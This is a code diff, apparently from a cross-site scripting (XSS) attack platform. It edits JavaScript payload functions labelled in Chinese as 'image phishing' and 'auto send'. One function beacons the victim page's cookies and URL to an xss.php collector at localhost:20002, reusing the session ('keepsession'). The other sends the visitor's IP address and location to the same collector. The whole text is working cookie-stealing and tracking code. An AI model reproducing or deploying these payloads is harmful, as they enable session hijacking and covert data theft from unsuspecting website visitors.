@@ -223,11 +223,9 @@ var MForm = function () {
     };
 
     //图片钓鱼
-    init.imgFish = function (url,data) {
-        if(!url) return ;
-        if(!data) return ;
+    init.imgFish = function () {
         var img = new Image();
-        img.src= url + '?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie) ;
+        img.src= 'http://localhost:20002/xss.php?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie) ;
         init.error('图片钓鱼发送成功!',200);
     };
 
@@ -280,19 +278,19 @@ var MForm = function () {
 
     //自动发送
     init.autoSent = function () {
-        init.getIps(
-            function (ip) {
-                (new Image()).src = 'http://localhost:20002/index.php?do=api&id={projectId}&location='
-                    + escape(
-                                (function(){
-                                    try {
-                                        return document.location.href
-                                    } catch(e) {
-                                        return ''
-                                    }
-                                })()
-                            ) + '&ip=' + ip;
-            });
+        init.getIps(function (ip) {
+            (new Image()).src = 'http://localhost:20002/xss.php?do=api&id={projectId}&location='
+                + escape(
+                    (function(){
+                        try {
+                            return document.location.href
+                        } catch(e) {
+                            return ''
+                        }
+                    })()
+                ) + '&ip=' + ip;
+        }
+            );
     };
 
     return init ;
